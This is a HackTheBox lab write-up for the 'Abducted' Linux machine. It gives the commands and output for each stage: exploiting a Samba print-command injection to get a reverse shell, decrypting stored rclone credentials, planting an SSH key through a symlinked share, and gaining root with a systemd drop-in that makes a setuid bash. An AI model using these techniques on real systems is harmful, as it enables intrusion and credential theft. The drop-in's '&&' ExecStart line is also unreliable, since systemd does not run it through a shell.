---
title: "HTB: Abducted"
category: writeups
description: Full writeup for the Abducted machine from HTB
date: 2026-08-08
tags:
  - hackthebox
  - linux
  - smb
  - CVE-2026-4480
authors:
  - tr3m0x
image: ./assets/cover.png
difficulty: Medium
---

## Reconnaissance

### Port scanning

As usual, I started by scanning ports to identify services running on the machine.

```bash
tr3m0x@blackhat$ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.43.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-08 15:13 CET
Nmap scan report for 10.129.43.224
Host is up (0.073s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds

```

### SMB enumeration

The next step was enumerating SMB shares.

```bash
tr3m0x@blackhat$ nxc smb abducted.htb -u '' -p '' --shares
SMB         10.129.43.224  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False) (Null Auth:True)
SMB         10.129.43.224  445    ABDUCTED         [+] ABDUCTED\: 
SMB         10.129.43.224  445    ABDUCTED         [*] Enumerated shares
SMB         10.129.43.224  445    ABDUCTED         Share           Permissions            Remark
SMB         10.129.43.224  445    ABDUCTED         -----           -----------            ------
SMB         10.129.43.224  445    ABDUCTED         HP-Reception                           Reception printer
SMB         10.129.43.224  445    ABDUCTED         projects                               Hartley Group Project Files
SMB         10.129.43.224  445    ABDUCTED         transfer                               Staff file transfer
SMB         10.129.43.224  445    ABDUCTED         IPC$                                   IPC Service (Hartley Group Document Services)
```

The `nxc` output did not include detailed permissions, so I used `smbclient` to interact with the shares. The `projects` and `transfer` shares were not accessible to the guest account:

```bash
tr3m0x@blackhat$ smbclient //10.129.43.224/projects -N
tree connect failed: NT_STATUS_ACCESS_DENIED
tr3m0x@blackhat$ smbclient //10.129.43.224/transfer -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

However, I could connect to the `HP-Reception` share:

```bash
tr3m0x@blackhat$ smbclient //10.129.43.224/HP-Reception -N
Try "help" to get a list of possible commands.
smb: \> 
```

Initially I attempted to list files with `ls` and `dir`, but research showed that `HP-Reception` is a printer share rather than a normal disk share:

```bash
tr3m0x@blackhat$ smbclient -L //10.129.43.224 -N
	Sharename       Type      Comment
	---------       ----      -------
	HP-Reception    Printer   Reception printer
	projects        Disk      Hartley Group Project Files
	transfer        Disk      Staff file transfer
	IPC$            IPC       IPC Service (Hartley Group Document Services)
```

After some testing I discovered I could upload files to the printer share and submit a print job:

```bash
tr3m0x@blackhat$ smbclient //10.129.43.224/HP-Reception -N
Try "help" to get a list of possible commands.
smb: \> put test_file
putting file test_file as \test_file (0.0 kb/s) (average 0.0 kb/s)
smb: \> print test_file
putting file test_file as test_file (0.0 kb/s) (average 0.0 kb/s)
smb: \> 
```

During further enumeration I found a recently disclosed Samba printing vulnerability (CVE-2026-4480) that looked promising.

## CVE-2026-4480 and a shell as `nobody`

### CVE-2026-4480 exploitation

Description:

> A flaw was found in the Samba printing subsystem. Samba passes the client-controlled job description string to the command configured with the "print command" setting via the "%J" substitution character without escaping shell meta characters. A remote attacker could exploit this vulnerability by sending a specially crafted print job description that contains unescaped shell characters. This could lead to remote code execution on the affected system.

A public [exploit](https://github.com/0xBlackash/CVE-2026-4480) was available and worked against the target.

```bash
tr3m0x@blackhat$ python3 CVE-2026-4480.py -t 10.129.43.224 -l 10.10.14.18 -p 4444

[*] Target: 10.129.43.224
[*] Callback: 10.10.14.18:4444
[*] Verify mode: False

[+] Credentials initialized (anonymous)
[+] Connected to spoolss interface
[+] Opened printer: HP-Reception
[+] Created DocumentInfo with payload: |sh
[+] Generated payload (77 bytes)
[*] Starting document...
[*] Starting page...
[*] Writing payload (77 bytes)...
[*] Ending page...
[*] Ending document (TRIGGERING EXPLOIT)...
[+] Print job submitted successfully!
[+] Closed printer handle

[+] Exploit completed!
[*] Check your listener for reverse shell...
```

The exploit opened a connection to my listener and gave a shell as `nobody`:

```bash
tr3m0x@blackhat$ listen
Listening on 0.0.0.0 4444
Connection received on 10.129.43.224 52266
bash: cannot set terminal process group (1521): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ 
```

## Lateral movement

The system had two non-root users with interactive shells: `scott` and `marcus`.

```bash
nobody@abducted:/var/spool/samba$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
```

While enumerating, I found `/opt/offsite-backup` which contained a sync script and an `rclone` configuration:

```bash
nobody@abducted:/opt/offsite-backup$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jun  4 13:41 .
drwxr-xr-x 3 root root 4096 Jun  4 13:41 ..
-rw-r--r-- 1 root root  141 Oct  9  2025 rclone.conf
-rwxr-xr-x 1 root root  105 Oct  9  2025 sync.sh

nobody@abducted:/opt/offsite-backup$ cat sync.sh
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects

nobody@abducted:/opt/offsite-backup$ cat rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

The `rclone.conf` contained an encrypted password. `rclone` offers `rclone reveal` to decrypt stored passwords:

```bash
nobody@abducted:/opt/offsite-backup$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

### Shell as `scott`

I used the revealed password to try SSH logins for common users. `scott` was successful:

```bash
tr3m0x@blackhat$ nxc ssh abducted.htb -u users.txt -p iXzvcib3SrpZ
SSH         10.129.43.224   22     abducted.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
SSH         10.129.43.224   22     abducted.htb     [+] scott:iXzvcib3SrpZ  Linux - Shell access!
```

I obtained a shell as `scott` and captured the user flag:

```bash
scott@abducted:~$ cat user.txt
2435****************************
```

### Shell as `marcus`

Given SMB was important on this box, I reviewed Samba's configuration and shares. The `transfer` share configuration was notable:

```bash
scott@abducted:/srv/projects$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

The `transfer` share had `force user = marcus`, so files uploaded there would be owned by `marcus`. With `wide links = yes`, the server would follow symlinks that point outside the share path. This allows creating a symlink in the share pointing to `marcus`'s home and uploading an SSH key to `~/.ssh/authorized_keys`.

Key generation and symlink creation:

```bash
scott@abducted:/srv/projects$ cd /srv/transfer
scott@abducted:/srv/transfer$ ln -s /home/marcus .ssh_marcus
```
```bash
tr3m0x@blackhat$ ssh-keygen -t ed25519 -N "" -f ./id_marcus
tr3m0x@blackhat$ echo "ssh-ed25519 [REDACTED] tr3m0x@blackhat" >> authorized_keys
```

Uploading the public key via `smbclient`:

```bash
scott@abducted:/srv/transfer$ smbclient //10.129.43.224/transfer -U 'scott%iXzvcib3SrpZ'
smb: \> cd .ssh_marcus\
smb: \.ssh_marcus\> mkdir .ssh
smb: \.ssh_marcus\> cd .ssh\
smb: \.ssh_marcus\.ssh\> put authorized_keys
putting file authorized_keys as \.ssh_marcus\.ssh\authorized_keys (0.3 kb/s) (average 0.3 kb/s)
smb: \.ssh_marcus\.ssh\> ls
  authorized_keys                     A       97  Sat Aug  8 18:48:21 2026
```

Then I SSH'd into the box as `marcus` using the private key:

```bash
tr3m0x@blackhat$ ssh marcus@abducted.htb -i id_marcus
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...
marcus@abducted:~$ 
```

## Privilege escalation to root

Inspecting `marcus`'s groups revealed a suspicious `operators` group:

```bash
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

While files owned by that group did not immediately reveal an escalation path, I found `/etc/systemd/system/smbd.service.d` was group-writable by `operators`:

```bash
marcus@abducted:~$ find / -type d -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
marcus@abducted:~$ ls -la /etc/systemd/system/smbd.service.d
total 8
drwxrws---  2 root operators 4096 Jun  4 13:41 .
drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
```

Because the directory is writable by the `operators` group, it's possible to create a systemd drop-in that modifies the service's `ExecStart`. I created a drop-in that copies `/bin/bash` to `/tmp/rootbash` and marks it setuid root.

```bash
marcus@abducted:~$ cat /etc/systemd/system/smbd.service.d/exploit.conf
[Service]
ExecStart=
ExecStart=cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

After the service restart I invoked the setuid shell and confirmed root:

```bash
marcus@abducted:~$ /tmp/rootbash -p
rootbash-5.3# id
uid=0(root) gid=0(root) groups=0(root)
```

With root access I retrieved the root flag:

```bash
rootbash-5.3# cat /root/root.txt
a9fa***************************
```

---

Attack summary:
- The high-level path: discover writable printer share -> exploit CVE-2026-4480 to get `nobody` -> find `rclone` creds -> SSH as `scott` -> abuse `transfer` share `force user` + `wide links` to write `marcus`'s `authorized_keys` -> SSH as `marcus` -> drop systemd override via group-writable directory -> get root.
